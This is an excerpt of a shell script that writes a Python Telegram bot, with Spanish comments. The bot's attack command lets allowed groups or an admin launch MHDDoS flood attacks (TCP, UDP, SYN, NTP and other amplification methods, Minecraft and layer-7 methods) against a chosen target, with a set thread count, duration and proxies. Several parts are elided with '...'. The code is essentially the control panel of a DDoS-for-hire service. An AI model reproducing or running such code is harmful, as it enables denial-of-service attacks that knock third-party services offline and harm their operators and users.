...
# Crear el archivo bot.py y agregar el contenido
cat <<EOF > bot.py
import telebot
import subprocess
import requests
...
def handle_attack_command(message):
    ...
    # Verifica si el mensaje es de un grupo permitido
    if chat_id not in ALLOWED_GROUPS and user_id != ADMIN_ID:
    ...
    # Obtener y preparar proxies si es necesario
    proxy_file = None
    ...
    if metodo in {'MINECRAFT', 'MCBOT', 'TCP'}:
        command = f'python3 /path/to/MHDDoS/start.py {metodo} {objetivo} {max_threads} {tiempo} 1 {proxy_file}'
    elif metodo in {'MEM', 'RDP', 'NTP', 'ARD', 'VSE', 'SYN', 'UDP', 'CHAR'}:
        command = f'python3 /path/to/MHDDoS/start.py {metodo} {objetivo} {max_threads} {tiempo}'
    elif metodo in L7_METHODS:
        command = f'python3 /path/to/MHDDoS/start.py {metodo} {objetivo} {max_threads} 30000 {proxy_file} 1000 {tiempo}'
